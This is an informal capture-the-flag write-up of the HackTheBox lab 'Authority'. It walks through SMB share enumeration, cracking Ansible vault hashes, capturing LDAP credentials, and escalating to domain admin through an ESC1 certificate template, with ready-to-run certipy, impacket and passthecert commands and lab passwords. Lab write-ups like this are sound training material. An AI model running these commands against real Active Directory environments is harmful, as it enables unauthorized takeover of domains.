Started with a nmap scan
```
53 DNS
80 IIS 10.0
88 Kerberos
135 RPC
139
389 LDAP
636 LDAP
3268 LDAP
3269 LDAP
5985
8442 Apache tomcat
```
Domain `authority.htb` Hostname `AUTHORITY` 
Going to port `80` is default IIS page going to port `8443` is a Password self service  aka PWM we can look at the config for the logins and get a username so going to the SMB now we can use the guest login and there is one share we can read called `development` it has a lot in it but after looking around we found one file with some ansible creds in it `\automation\Ansible\PWM\defualts\main.yml` we need to copy these hashes into a file and then use `ansible2john` and we can use hashcat to crack the hashes `hashcat ansible_hash rockyou.txt --username -m 16900` and they call cracked to the same password `!@#$%^&*` and now we can decrypt the password blobs `cat file | ansible-vualt decrypt` and we do this for 3 files and then we get the logins 
```
ldap admin:DevT3st@123
svc_pwm:pWm_@dm!N_!23
```
if we go to the site and go to the config editor we can login with the svc password messing around in the site we can edit the ldap connection and capture some creds I used ncat but did not work out the best so we need to use wireshark to get these creds and we got the creds for the ldap user `svc_ldap:lDaP_1N_th3_cle4r!` and we can winrm as this user now I cant find much so going off the name of the machine it might have to do with some certs so we can see if there is any vulnerable templates `certipy-ad find -u svc_ldap -p lDaP_1N_th3_cle4r! -target authority.htb -text -stdout -vulnerable` and we got `ESC1` now we can add a machine account `impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1N_th3_cle4r!' -method LDAPS -computer-name bowser -computer-pass bowser -dc-ip 10.10.11.222` and now we need to request the cert `certipy-ad req -username 'bowser' -password bowser -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb` when we try and auth it gives us a error do we have to do it a different way we need to get the keys out of the pfx file
`certipy-ad cert -pfx administrator_authority.pfx -nocert -out admin.key` and then `certipy-ad cert -pfx administrator_authority.pfx -nokey -out admin.crt` now we can do pass the cert `python passthecert.py -action ldap-shell -crt administrator.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222` and then we need to do `add_user_to_group svc_ldap administrators` and now we re auth with winrm with `svc_ldap` and we are admin 